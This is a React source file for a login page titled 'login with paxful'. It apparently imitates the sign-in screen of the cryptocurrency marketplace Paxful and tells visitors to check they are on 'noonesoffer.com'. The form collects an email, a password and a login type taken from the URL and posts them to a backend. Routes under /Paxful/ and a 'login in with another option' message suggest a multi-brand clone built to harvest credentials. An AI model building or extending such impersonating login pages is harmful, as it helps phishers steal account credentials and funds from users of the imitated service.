import React, { useState, useEffect } from 'react';
import { Link, useParams } from 'react-router-dom';
import '../../paxstyle.css';
import '../../styles.css';
import { FontAwesomeIcon} from '@fortawesome/react-fontawesome';
import { faEye, faLock, faGlobe, faInfoCircle} from '@fortawesome/free-solid-svg-icons';

const LoginpaxPage = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [errortextemail, setErrortextEmail] = useState('');
  const [errortextpwd, setErrortextPwd] = useState('');
  const [errortextUser, setErrortextUser] = useState('');
  const { userType } = useParams(); // Retrieve usertype from the URL

  useEffect(() => {
    const showPwdIcon = document.getElementById('showPwdIcon');
    const passwordInput = document.getElementById('pwd');

    const handleEyeIconClick = () => {
      const passwordFieldType = passwordInput.getAttribute('type');
      passwordInput.setAttribute('type', passwordFieldType === 'password' ? 'text' : 'password');
    };

    showPwdIcon.addEventListener('click', handleEyeIconClick);

    return () => {
      showPwdIcon.removeEventListener('click', handleEyeIconClick);
    };
  }, []);

  const handleSubmit = async (event) => {
    event.preventDefault();

    try {
      // Simulating an AJAX call to load user data from the server
      const response = await fetch('http://localhost:8080/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password, userType }), // Send user credentials to the server
      });

      const data = await response.json();

      if (data.success) {
        // Login successful
        window.location.href = '/home';
      } else {
        // Login failed
        if (data.error === 'Invalid user type') {
          setErrortextUser('Login in with another option');
        } else {
          if (!email.trim()) {
            setErrortextEmail('E-mail Required!');
          } else if (!isValidEmail(email)) {
            setErrortextEmail('Enter A Valid E-mail!');
          }

          if (!password.trim()) {
            setErrortextPwd('Password is Required!');
          }
        }
      }
    } catch (error) {
      console.error('Error during login:', error);
    }
  };

  const isValidEmail = (email) => {
    // Simple email validation, replace with your actual validation logic
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  return (
    <body>
      <div className="content_container">
        <div className="content_first_Cont">
          <div className="nav1">
            <div className="logo">
              <div className="img">
                
              </div>
            </div>
            <div className="lan">
              <div className="wrld">
              <FontAwesomeIcon icon={faGlobe}/>
              </div>
              <div className="select">
                <select name="" id="">
                  <option value="">English</option>
                  <option value="">Français</option>
                  <option value="">Español</option>
                </select>
              </div>

            </div>
          </div>
          <div className="form_cont1">
            <div className="nav2">
              <div className="headnav2">
                <h1>login with paxful</h1>
              </div>
            </div>
            <div className="err">
              <div className="info">
              <FontAwesomeIcon icon={faInfoCircle}/>
              </div>
              <div className="text">
                <p>IMPORTANT! Please check that<br /> you are visiting<br /> https://noonesoffer.com/</p>
              </div>
              <div className="link">
                <p><span><FontAwesomeIcon icon={faLock}/>https://</span><b>noonesoffer.com/</b></p>
              </div>
            </div>
            <div className="errr">
              <div className="info">
              <FontAwesomeIcon icon={faInfoCircle}/>
              </div>
              <div className="text">
                <p>IMPORTANT! Please check that you are visiting<br /> https://noonesoffer.com/</p>
                <div className="link">
                  <p><span><i className="fa-solid fa-eye"></i>https://</span><b>noonesoffer.com/</b></p>
                </div>
              </div>

            </div>
            <div className="form">
              <p>Your Phone or Email</p>
              <form action="" id="myForm" autocomplete="off" onSubmit={handleSubmit}>
                <div className="form_input">
                  <input type="text" name="email" id="email" value={email} onChange={(e) => setEmail(e.target.value)} style={{ marginBottom: "15px;" }} />
                  <div className="error-text" style={{ color: "red" }}>
                    {errortextemail}{errortextpwd}{errortextUser}
                  </div>
                </div>
                <div className="flex" style={{ display: "flex", justifyContent: "space-between" }}>
                  <p>Your Password</p>
                  <p style={{ justifyContent: "flex-end", right: "0", color: '#0052cc' }}>Forgot password?</p>
                </div>
                <div className="form_input pwd">
                  <input type="password" name="pwd" id="pwd" style={{ marginBottom: "5px" }} value={password} onChange={(e) => setPassword(e.target.value)} />
                  <div id="showPwdIcon">
                  <FontAwesomeIcon icon={faEye}/>

                  </div>
                </div>
                <div className="form_input button">
                  <button type="submit" name="submit">
                    <div className="log">
                      Login
                    </div>
                    <div className="arrow"> &gt; </div>
                  </button>
                </div>
                <p className="error">

                </p>
              </form>
              <hr />
              <div className="lastnav">
                <p>New on Paxful?
                  <Link to="/Paxful/register/details/paxful"><span style={{ color: "#0052cc;" }}>Create an Account</span></Link>
                </p>
              </div>
            </div>
          </div>

        </div>
        <div className="content_second_cont">
          <div className="color">

          </div>
          <div className="image_tag">
            <div className="img">
              <div className="imgy">
               
              </div>
            </div>

          </div>
        </div>
      </div>
      <script src="../js/all.js"></script>
    </body>
  );
};

export default LoginpaxPage;
